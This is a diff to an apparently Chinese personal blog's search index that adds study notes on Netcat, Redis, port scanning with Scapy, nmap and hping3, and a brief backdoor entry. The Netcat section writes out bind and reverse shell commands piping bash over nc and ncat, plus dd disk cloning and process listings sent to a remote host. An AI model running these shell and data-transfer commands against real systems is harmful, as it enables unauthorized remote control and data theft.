@@ -141,6 +141,103 @@
       </tags>
   </entry>
   <entry>
+    <title>Netcat的几种常用方式</title>
+    <url>/2021/12/28/NetCat%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="TELNET-BANNER"><a href="#TELNET-BANNER" class="headerlink" title="TELNET/BANNER"></a>TELNET/BANNER</h2><ul>
+<li><code>nc -nv ip port</code> 连接 ip 端口  <code>-n</code> 是跟ip地址不做域名解析 <code>-v</code> 是显示详细信息<ul>
+<li><code>head /</code> 80端口 如果返回 open  再输入这个命令可以获取http head</li>
+</ul>
+</li>
+</ul>
+<hr>
+<span id="more"></span>
+<h2 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h2><ul>
+<li>A: <code>nc -l -p 4444</code> A服务器开放一个4444端口侦听（服务端）</li>
+<li>B: <code>nc -nv ip 4444</code> 连接A服务器的4444端口（客户端）<br>  <a href="https://imgtu.com/i/TsrCsx"><img data-src="https://s4.ax1x.com/2021/12/28/TsrCsx.png" alt="TsrCsx.png"></a></li>
+<li>远程电子取证信息收集<br>  <a href="https://imgtu.com/i/TsrFeK"><img data-src="https://s4.ax1x.com/2021/12/28/TsrFeK.png" alt="TsrFeK.png"></a><br>  同理  可以 <code>ps aux | nc -nv ip port</code> 输出进程信息 查看有没有可疑的进程<ul>
+<li>写入文件<ul>
+<li>A: <code>nc -l -p 333 &gt; ps.txt</code> 开放端口并将后续收集的信息写入 ps.txt</li>
+<li>B: <code>ps aux | nc -nv ip port -q 1</code>   -q 1的意思是，完成任务后等待1秒退出-断开连接，不退出会一直进行tcp连接无法判断是否未完成</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="传输文件-目录"><a href="#传输文件-目录" class="headerlink" title="传输文件/目录"></a>传输文件/目录</h2><ul>
+<li>相当于是一个可上传文件的 ftp服务器</li>
+<li>传输文件<ul>
+<li>A: <code>nc -lp 333 &gt; 1.mp4 q 1</code> A接收端 侦听333端口 输出到1.mp4 &gt;输出</li>
+<li>B: <code>nc -nv 1.1.1.1 333 &lt; 1.mp4 -q -1</code> B发送端 输入文件 到A  &lt;输入<br>正向传输<br><a href="https://imgtu.com/i/TsrVFe"><img data-src="https://s4.ax1x.com/2021/12/28/TsrVFe.png" alt="TsrVFe.png"></a></li>
+<li>或</li>
+<li>A: <code>nc -q 1 -lp 333 &lt; a.mp4</code> A发送端 输入文件  等待其他连接，如果被连接 文件流入到对方电脑 并在1秒后断开连接</li>
+<li>B: <code>nc -nv 1.1.1.1 333 &gt; a.mp4</code> B接收端和A建立连接 接收A的文件<br>反向传输<br><a href="https://imgtu.com/i/TsrZJH"><img data-src="https://s4.ax1x.com/2021/12/28/TsrZJH.png" alt="TsrZJH.png"></a></li>
+</ul>
+</li>
+<li>传输目录<ul>
+<li>A: <code>tar -cvf 目录 | nc -lp 333 -q 1</code> A发送 先把前面的目录打包成tar文件，然后开放333端口 等待连接，如果连接 就发送打包的tar包，等待一秒断开连接</li>
+<li>B: <code>nc 1.1.1.1 333 | tar -zxf -</code> B接收 和A建立连接，接收打包的tar 目录，然后进行解压命令，目录就过来了<br>也可以进行反向传输</li>
+</ul>
+</li>
+<li>加密传输<ul>
+<li>A: <code>nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &lt; 1.mp4</code> A接收端 开放333端口等待连接 接收加密文件，然后将加密的文件内容重定向给 mcrypt解密，解密后在重定向保存成文件</li>
+<li>B: <code>mcrypt --flush -Fbq -a rljndael-256 -m ecb &lt; 1.mp4 | nc -nv 1.1.1.1 333 q 1</code> B发送端 先使用加密算法对 文件内容进行加密，然后把加密后的文件内容作为一个输入，再把加密文件 传输给nc 去连接对方的ip+端口 ，如果对方是等待连接的状态，就会直接发送，成功，等待1秒断开连接<br><a href="https://imgtu.com/i/TsruQI"><img data-src="https://s4.ax1x.com/2021/12/28/TsruQI.png" alt="TsruQI.png"></a><br>mcrypt 默认是没有安装的，需要自行安装<br><code>apt-get install mcrypt</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h2><ul>
+<li>A: <code>cat 1.mp4 | nc -pl 333</code> A服务端  查看视频文件 给 333端口作为输入</li>
+<li>B: <code>nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code> B客户端 和A建立连接，收到的视频流输出给媒体播放器，媒体播放器作为输出的播放客户端，接收到一点流就播放一点</li>
+</ul>
+<p>mplayer默认没有安装</p>
+<hr>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul>
+<li><code>nc -nvz 1.1.1.1 1-65535</code>   -z扫描模式 默认情况下扫描的是tcp端口</li>
+<li><code>nc -nvzu 1.1.1.1 1-65535</code> -u udp端口  扫描开放的udp端口 </li>
+</ul>
+<hr>
+<h2 id="远程克隆硬盘"><a href="#远程克隆硬盘" class="headerlink" title="远程克隆硬盘"></a>远程克隆硬盘</h2><ul>
+<li>A: <code>nc -lp 333 | dd of=/dev/sda</code> </li>
+<li>B: <code>dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></li>
+<li>远程电子取证，可以将目标服务器硬盘远程复制，或者内存。</li>
+</ul>
+<hr>
+<h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><ul>
+<li>正向:<ul>
+<li>A: <code>nc -lp 333 -c bash</code> -c 连接一个shell A服务端开放333 传递bash shell</li>
+<li>B: <code>nc 1.1.1.1 333</code> B客户端 连接 控制A bash shell<br>远程控制的权限取决于 发出建立连接的用户<br><a href="https://imgtu.com/i/Tsrlef"><img data-src="https://s4.ax1x.com/2021/12/28/Tsrlef.png" alt="Tsrlef.png"></a></li>
+</ul>
+</li>
+<li>反向:<ul>
+<li>A: <code>nc -lp 333</code> 开放333端口侦听</li>
+<li>B: <code>nc 1.1.1.1 333 -c bash</code> 把bash shell 传递给A</li>
+</ul>
+</li>
+</ul>
+<p>Windows用户可以把bash改成 cmd；</p>
+<hr>
+<h2 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h2><p>Ncat是用来弥补Netcat缺乏加密和身份验证而开发的</p>
+<ul>
+<li>NC缺乏加密和身份验证的能力</li>
+<li>Ncat包含于nmap工具包中</li>
+<li>A: <code>ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl</code> –allow  允许哪个ip地址去连接 <code>-vnl 端口</code> 开放侦听端口 <code>--ssl</code> ssl加密</li>
+<li>B: <code>ncat -nv 1.1.1.1 333 --ssl</code> **连接也要加上 **<code>**--**``ssl</code></li>
+</ul>
+<p>内容全是加密的，即使有第三者进行抓包、嗅探，也看不懂</p>
+<ul>
+<li>不同系统/平台的nc参数功能不尽相同</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Netcat</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>Netcat</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Nmap的常用命令</title>
     <url>/2021/12/26/Nmap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><ul>
@@ -253,6 +350,93 @@
       </tags>
   </entry>
   <entry>
+    <title>Redis的两种持久化机制</title>
+    <url>/2021/12/28/Redis%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Redis的高性能是由于其将所有数据都存储在了内存中,为了使Redis在重启之后仍能保证数据不丢失,需要将数据从内存同步到硬盘中,这一过程就是持久化. Redis支持两种方式的持久化, 一种是RDB方式, 一种是AOF方式, 可以单独使用其中一种或将两者结合使用</p>
+<span id="more"></span>
+<ul>
+<li>RDB持久化(默认支持,无需配置)<br>  该机制是指在指定的时间间隔内将内存中的数据集快照写入磁盘</li>
+<li>AOF持久化<br>  该机制将以日志的形式记录服务器所处理的每一个写操作, 在Redis服务器启动之初会读取该文件夹来重新构建数据库,以保证启动后数据库中的数据是完整的.</li>
+<li>无持久化<br>  我们可以通过配置的方式禁用Redis服务器的持久化功能,这样我们就可以将Redis视为一个功能加强的memcached了</li>
+<li>redis可以同时使用RDB和AOF</li>
+</ul>
+<hr>
+<h2 id="RDB持久化机制"><a href="#RDB持久化机制" class="headerlink" title="RDB持久化机制"></a>RDB持久化机制</h2><h3 id="RDB持久化机制的优点"><a href="#RDB持久化机制的优点" class="headerlink" title="RDB持久化机制的优点"></a>RDB持久化机制的优点</h3><ul>
+<li>一旦采用该方式,那么你的整个Redis数据库将只包含一个文件,这对于文件备份而言是非常完美的. 比如,你可能打算每个小时归档一次最近24小时的数据,同时还要每天归档一次最近30天的数据.通过这样的备份策略,一旦系统出现灾难性故障,我们可以非常容易的进行恢复.</li>
+<li>对于灾难性回复而言,RDB是非常不错的选择. 因为我们可以非常轻松的将一个单独文件压缩后再转移到其他存储介质上</li>
+<li>性能最大化. 对于Redis的服务进程而言,再开始持久化时, 它唯一需要做的只是fork(分叉) 出子进程,之后再由子进程完成这些持久化工作,这样就可以极大的避免服务进程执行IO操作了.</li>
+</ul>
+<p>相比于AOF机制,如果数据集很大,RDB的启动效率会更高.</p>
+<p>备份的文件</p>
+<p><a href="https://imgtu.com/i/TssHET"><img data-src="https://s4.ax1x.com/2021/12/28/TssHET.png" alt="TssHET.png"></a></p>
+<p><a href="https://imgtu.com/i/TssOC4"><img data-src="https://s4.ax1x.com/2021/12/28/TssOC4.png" alt="TssOC4.png"></a></p>
+<hr>
+<h2 id="AOF持久化机制"><a href="#AOF持久化机制" class="headerlink" title="AOF持久化机制"></a>AOF持久化机制</h2><h3 id="AOF持久化机制优点"><a href="#AOF持久化机制优点" class="headerlink" title="AOF持久化机制优点"></a>AOF持久化机制优点</h3><ul>
+<li>该机制可以带来更高的数据安全性,即数据持久性. Redis中提供了3种同步策略, 即每秒同步,每修改同步和不同步.事实上每秒同步也是异步完成的,其效率也是非常高的. 所差的是一旦系统出现宕机现象,那么这一秒钟之内修改的数据将会丢失.而每修改同步,我们可以将其视为同步持久化,即每次发生的数据变化都会被立即记录到硬盘中.可以预见,这种方式再效率上是最低的.至于无同步 ,无需多言</li>
+<li>由于该机制对日志文件的写入操作采用的是append模式,因此在写入过程中即使出现宕机现象,也不会破坏日志文件中已经存在的内容.然而 如果我们本次操作只是写入了一半数据就出现了系统崩溃问题,不用担心, 在Redis下一次启动之前, 我们可以通过 redis-check-aof工具帮我们解决数据一致性问题</li>
+<li>如果日志过大,Redis可以自动启用rewrite机制.即Redis以append模式不断的将修改数据写入到老的磁盘文件中,同时Redis还会创建一个新的文件用于记录所有的修改操作.事实上,我们也可以通过该文件完成数据的重建<h3 id="AOF持久化机制缺点"><a href="#AOF持久化机制缺点" class="headerlink" title="AOF持久化机制缺点"></a>AOF持久化机制缺点</h3></li>
+<li>对于相同数量的数据集而言,AOF文件通常要大于RDB文件</li>
+<li>根据同步策略的不同,AOF在运行效率上往往会慢于RDB. 总之,每秒同步策略的效率是比较高的, 同步禁用策略的效率和RDB一样高效<h3 id="开启AOF持久化"><a href="#开启AOF持久化" class="headerlink" title="开启AOF持久化"></a>开启AOF持久化</h3></li>
+</ul>
+<p>打开配置文件,将appendonly 修改为yes,开启aof持久化机制,默认会在目录下产生一个appendonly.aof文件</p>
+<h3 id="AOF持久化时机"><a href="#AOF持久化时机" class="headerlink" title="AOF持久化时机"></a>AOF持久化时机</h3><p><a href="https://imgtu.com/i/TssvvR"><img data-src="https://s4.ax1x.com/2021/12/28/TssvvR.png" alt="TssvvR.png"></a></p>
+]]></content>
+      <categories>
+        <category>Redis</category>
+      </categories>
+      <tags>
+        <tag>Redis</tag>
+        <tag>开发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Redis的常用命令</title>
+    <url>/2021/12/28/Redis%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="Key"><a href="#Key" class="headerlink" title="Key"></a>Key</h2><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul>
+<li><code>del key</code><br>  删除指定key</li>
+<li><code>exists key</code><br>  获取key是否存在</li>
+<li><code>type key</code><br>  获取key类型</li>
+<li><code>sort key</code><br>  排序，默认只能给数字排序<code>asc</code> <code>desc</code><br>  如果要按字母排序 后续参数加上 <code>alpha</code></li>
+<li><code>rename key newkey</code><br>  改key名</li>
+<li><code>renamenx key newkey</code><br>  存在就改 不存在就不改  <span id="more"></span></li>
+</ul>
+<hr>
+<h3 id="时效性控制"><a href="#时效性控制" class="headerlink" title="时效性控制"></a>时效性控制</h3><ul>
+<li>指定key设置有效期<ul>
+<li><code>expire key seconds</code></li>
+<li><code>pexpire key milliseconds</code></li>
+<li><code>expireat key timestamp</code></li>
+<li><code>pexpireat key milliseconds-timestamp</code></li>
+</ul>
+</li>
+<li>获取key的有效时间<ul>
+<li><code>ttl key</code> 返回 -1表示永久有效 -2是不存在key</li>
+<li><code>pttl key</code> 返回毫秒</li>
+</ul>
+</li>
+<li>切换key从时效性转换为永久性<ul>
+<li><code>persist key</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p><a href="https://imgtu.com/i/TsstAO"><img data-src="https://s4.ax1x.com/2021/12/28/TsstAO.png" alt="TsstAO.png"></a></p>
+<hr>
+<h2 id="DB"><a href="#DB" class="headerlink" title="DB"></a>DB</h2><p><a href="https://imgtu.com/i/Tssrut"><img data-src="https://s4.ax1x.com/2021/12/28/Tssrut.png" alt="Tssrut.png"></a></p>
+<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul>
+<li>切换数据库<br>  <code>select index</code><br>  <a href="https://imgtu.com/i/TssyHf"><img data-src="https://s4.ax1x.com/2021/12/28/TssyHf.png" alt="TssyHf.png"></a></li>
+<li>其他操作<br>  <code>ping</code> 测试服务器是否联通<br>  <a href="https://imgtu.com/i/Tss24g"><img data-src="https://s4.ax1x.com/2021/12/28/Tss24g.png" alt="Tss24g.png"></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Redis</category>
+      </categories>
+      <tags>
+        <tag>Redis</tag>
+        <tag>开发</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Redis的数据类型</title>
     <url>/2021/12/28/Redis%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
     <content><![CDATA[<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="Key"><a href="#Key" class="headerlink" title="Key"></a>Key</h2><p>关于key的定义,注意如下几点:</p>
@@ -338,6 +522,9 @@
     <title>什么是SQL注入</title>
     <url>/2021/12/28/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h1><p>SQL注入（英语：SQL Injection），也称SQL注入或SQL注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。</p>
+<span id="more"></span>
+
+
 <p>能改变原有SQL语句的漏洞就是SQL注入</p>
 <p>不论是学习后端开发、数据库、网络安全，SQL注入安全隐患反复被提起</p>
 ]]></content>
@@ -347,6 +534,126 @@
       <tags>
         <tag>网络</tag>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于端口扫描</title>
+    <url>/2021/12/28/%E5%85%B3%E4%BA%8E%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
+    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><ul>
+<li>端口对应网络服务及应用端服务</li>
+<li>服务端程序的漏洞通过端口攻入</li>
+<li>发现开放的端口</li>
+<li>更具体的攻击面</li>
+</ul>
+<hr>
+<span id="more"></span>
+<h2 id="UDP端口扫描"><a href="#UDP端口扫描" class="headerlink" title="UDP端口扫描"></a>UDP端口扫描</h2><ul>
+<li>假设ICMP port-unreachable 响应代表端口关闭<ul>
+<li>目标系统不响应ICMP port-unreachable时，可能产生误判</li>
+<li>完整的UDP应用层请求<ul>
+<li>准确性高</li>
+<li>耗时巨大</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="Scapy-UDP-Scan"><a href="#Scapy-UDP-Scan" class="headerlink" title="Scapy UDP Scan"></a>Scapy UDP Scan</h2></li>
+<li>端口关闭: ICMP port-unreachable</li>
+<li>端口开放: 没有回包</li>
+<li>了解每一种基于UDP的应用层包结构很有帮助</li>
+<li>与三层相同的技术</li>
+<li>误判</li>
+<li>Scapy<ul>
+<li>sr1(IP(dst=”1.1.1.1”)/UDP(dport=53),timeout=1,verbose=1)</li>
+</ul>
+</li>
+<li>./udp_scan.py 1.1.1.1 1 100</li>
+</ul>
+<hr>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><ul>
+<li><code>nmap -sU 1.1.1.1</code><ul>
+<li> UDP扫描</li>
+<li>不指定端口默认扫描常用的1000个端口</li>
+</ul>
+</li>
+<li><code>nmap -iL iplist.txt -sU -p 1-200</code></li>
+</ul>
+<hr>
+<h2 id="TCP端口扫描"><a href="#TCP端口扫描" class="headerlink" title="TCP端口扫描"></a>TCP端口扫描</h2><ul>
+<li>基于连接的协议</li>
+<li>三次握手</li>
+<li>隐蔽扫描</li>
+<li>僵尸扫描</li>
+<li>全连接扫描</li>
+<li>所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态</li>
+</ul>
+<p><a href="https://imgtu.com/i/TssM9J"><img data-src="https://s4.ax1x.com/2021/12/28/TssM9J.png" alt="TssM9J.png"></a></p>
+<hr>
+<h2 id="隐蔽扫描——SYN"><a href="#隐蔽扫描——SYN" class="headerlink" title="隐蔽扫描——SYN"></a>隐蔽扫描——SYN</h2><ul>
+<li>不建立完整连接</li>
+<li>应用日志不记录扫描行为——隐蔽</li>
+</ul>
+<hr>
+<h2 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h2><ul>
+<li>极度隐蔽</li>
+<li>实施条件苛刻</li>
+<li>可伪造源地址</li>
+<li>选择僵尸机<ul>
+<li>闲置系统</li>
+<li>系统使用递增的IPID<ul>
+<li>0</li>
+<li>随机</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><a href="https://imgtu.com/i/TssQ39"><img data-src="https://s4.ax1x.com/2021/12/28/TssQ39.png" alt="TssQ39.png"></a></p>
+<hr>
+<h2 id="隐蔽端口扫描"><a href="#隐蔽端口扫描" class="headerlink" title="隐蔽端口扫描"></a>隐蔽端口扫描</h2><ul>
+<li>Syn——syn/ack——rst</li>
+<li>Scapy<ul>
+<li><code>sr1(IP(dst="192.168.60.3")/TCP(dport=80),timeout=1,verbose=1)</code></li>
+<li><code>./syn_scan.py</code></li>
+</ul>
+</li>
+<li>nmap</li>
+<li><code>nmap -sS 1.1.1.1 -p 80,21,25,110,443</code> -sS 扫描发送SYN包</li>
+<li><code>nmap -sS 1.1.1.1 -p 1-65535 --open</code></li>
+<li><code>nmap -sS 1.1.1.1 -p- --open</code></li>
+<li><code>nmap -sS -iL iplist.txt -p 80</code></li>
+<li>hping3</li>
+<li><code>hping3 1.1.1.1 --scan 80 -S</code> -S表示用SYN的方式</li>
+<li><code>hping3 1.1.1.1 --scan 80,21,25,443 -S</code></li>
+<li><code>hping3 1.1.1.1 --scan 0-65535 -S</code></li>
+<li><code>hping3 -c 10 -S -spoof 1.1.1.2 -p ++1 1.1.1.3</code></li>
+</ul>
+<hr>
+<h2 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h2><ul>
+<li>Scapy<ul>
+<li>Syn扫描不需要raw packets</li>
+<li>内核认为syn/ack时非法包，直接发送rst终端连接</li>
+<li>全连接扫描对scapy比较困难</li>
+</ul>
+</li>
+<li><code>sr1(IP(dst="192.168.20.2")/TCP(dport=22,flags='S'))</code></li>
+<li><code>./tcp_scan1.py</code></li>
+<li><code>./tcp_scan2.py</code></li>
+<li><code>iptabls -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.20.2 -j DROP</code></li>
+<li>nmap</li>
+<li><code>nmap -sT 1.1.1.1 -p 80</code> -sT表示用TCP全连接扫描 </li>
+<li><code>nmap -sT 1.1.1.1 -p 80,21,25</code></li>
+<li><code>nmap -sT 1.1.1.1 -p 80-2000</code></li>
+<li><code>nmap -sT -iL iplist.txt -p 80</code></li>
+<li>默认1000个常用的端口</li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
+        <tag>扫描技术</tag>
       </tags>
   </entry>
   <entry>
@@ -465,6 +772,7 @@ redirectPort="8443" /&gt;
     <title>关于后门</title>
     <url>/2021/12/28/%E5%90%8E%E9%97%A8/</url>
     <content><![CDATA[<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><h2 id="什么是后门？有哪些后门？"><a href="#什么是后门？有哪些后门？" class="headerlink" title="什么是后门？有哪些后门？"></a>什么是后门？有哪些后门？</h2><p>后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。类别：网页、线程插入、扩展、C/S后门。</p>
+<span id="more"></span>
 <h2 id="后门在安全测试中的实际意义？"><a href="#后门在安全测试中的实际意义？" class="headerlink" title="后门在安全测试中的实际意义？"></a>后门在安全测试中的实际意义？</h2><p>例如后门藏在网页上、软件内，悄无声息的进行攻击者想要的操作。</p>
 <h2 id="关于后门需要了解哪些？（玩法、免杀）"><a href="#关于后门需要了解哪些？（玩法、免杀）" class="headerlink" title="关于后门需要了解哪些？（玩法、免杀）"></a>关于后门需要了解哪些？（玩法、免杀）</h2><p>免杀，简单来讲就是绕过杀毒软件等。</p>
 ]]></content>
